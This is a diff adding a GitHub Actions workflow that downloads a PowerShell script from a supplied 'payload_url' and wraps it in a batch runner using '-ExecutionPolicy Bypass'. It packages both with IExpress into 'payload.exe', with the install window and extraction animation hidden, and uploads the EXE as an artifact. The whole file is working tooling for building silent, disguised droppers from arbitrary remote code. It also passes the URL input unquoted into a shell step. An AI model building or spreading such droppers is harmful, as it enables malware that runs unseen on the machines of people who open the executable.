@@ -1,0 +1,66 @@
+name: Build PowerShell EXE using IExpress
+
+on:
+  workflow_dispatch:
+    inputs:
+      payload_url:
+        description: 'URL to fetch payload'
+        required: true
+        type: string
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    # Step 1: Checkout the repository
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    # Step 2: Download PowerShell script from the given URL
+    - name: Fetch Payload Script
+      shell: powershell
+      run: |
+        $url = '${{ github.event.inputs.payload_url }}'
+        Invoke-WebRequest -Uri $url -OutFile 'payload.ps1'
+
+    # Step 3: Create runner.bat to execute the PowerShell script
+    - name: Create Runner Batch File
+      shell: powershell
+      run: |
+        Set-Content -Path "runner.bat" -Value "@echo off`n" -Encoding ASCII
+        Add-Content -Path "runner.bat" -Value "powershell.exe -ExecutionPolicy Bypass -File `"%TEMP%\payload.ps1`"" -Encoding ASCII
+        Add-Content -Path "runner.bat" -Value "exit" -Encoding ASCII
+
+    # Step 4: Create SED file for IExpress
+    - name: Create IExpress SED Configuration
+      shell: powershell
+      run: |
+        Set-Content -Path "package.sed" -Value @"
+        [Version]
+        Class=IEXPRESS
+        SEDVersion=3
+        [Options]
+        ExtractOnly=0
+        ShowInstallProgramWindow=0
+        HideExtractAnimation=1
+        TargetName=payload.exe
+        [Strings]
+        InstallProgram=runner.bat
+        SourceFiles=.
+        [SourceFiles0]
+        %SourceFiles%\payload.ps1=
+        %SourceFiles%\runner.bat=
+        "@ -Encoding ASCII
+
+    # Step 5: Run IExpress to create the EXE
+    - name: Build EXE using IExpress
+      shell: cmd
+      run: iexpress /N /Q package.sed
+
+    # Step 6: Upload the generated EXE
+    - name: Upload Executable
+      uses: actions/upload-artifact@v4
+      with:
+        name: payload_exe
+        path: payload.exe
